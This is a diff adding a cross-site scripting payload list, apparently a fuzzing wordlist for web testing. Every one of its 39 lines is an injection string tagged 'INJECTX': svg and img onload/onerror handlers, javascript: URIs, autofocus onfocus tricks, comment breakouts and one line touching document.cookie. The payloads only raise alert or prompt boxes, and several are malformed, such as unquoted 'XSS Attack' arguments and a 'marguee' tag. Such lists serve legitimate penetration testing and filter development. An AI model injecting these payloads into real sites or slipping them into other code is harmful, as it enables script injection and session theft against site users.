@@ -1,0 +1,39 @@
+javascript:alert(XSS Attack)//INJECTX
+<svg/onload=alert(XSS Attack)>//INJECTX
+<img onload=alert(XSS Attack)>//INJECTX
+<img src=x onerror=prompt(XSS Attack)>//INJECTX
+<a href="javascript:alert(XSS Attack)" onmouseover=alert(XSS Attack)>INJECTX HOVER</a>
+ onmouseover="document.cookie=true;">//INJECTX
+alert(XSS Attack)>//INJECTX
+<h1>INJECTX</h1>
+<img src=x onload=prompt(XSS Attack) onerror=alert(XSS Attack) onmouseover=prompt(XSS Attack)>
+<svg><script>/<@/>alert(XSS Attack)</script>//INJECTX
+<svg/onload=alert(/INJECTX/)>
+<iframe/onload=alert(/INJECTX/)>
+<svg/onload=alert`INJECTX`>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(`INJECTX`)>
+}alert(/INJECTX/);{//
+<h1/onclick=alert(XSS Attack)>a//INJECTX
+<svg/onload=alert(/INJECTX/)>
+<p/onclick=alert(/INJECTX/)>a
+<svg/onload=alert`INJECTX`>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(`INJECTX`)>
+<video><source onerror="javascript:alert(XSS Attack)">//INJECTX
+<video onerror="javascript:alert(XSS Attack)"><source>//INJECTX
+<audio onerror="javascript:alert(XSS Attack)"><source>//INJECTX
+<input autofocus onfocus=alert(XSS Attack)>//INJECTX
+<select autofocus onfocus=alert(XSS Attack)>//INJECTX
+<textarea autofocus onfocus=alert(XSS Attack)>//INJECTX
+<keygen autofocus onfocus=alert(XSS Attack)>//INJECTX
+<button form=test onformchange=alert(XSS Attack)>//INJECTX
+<form><button formaction="javascript:alert(XSS Attack)">//INJECTX
+<svg onload=(alert)(XSS Attack) >//INJECTX
+<script>$=XSS Attack,alert($)</script>//INJECTX
+<!--<img src="--><img src=x onerror=alert(XSS Attack)//">//INJECTX
+<img/src='x'onerror=alert(XSS Attack)>//INJECTX
+<marguee/onstart=alert(XSS Attack)>//INJECTX
+<script>alert(XSS Attack)//INJECTX
+<script>alert(XSS Attack)<!--INJECTX
+<marquee loop=1 width=0 onfinish=alert(XSS Attack)>//INJECTX
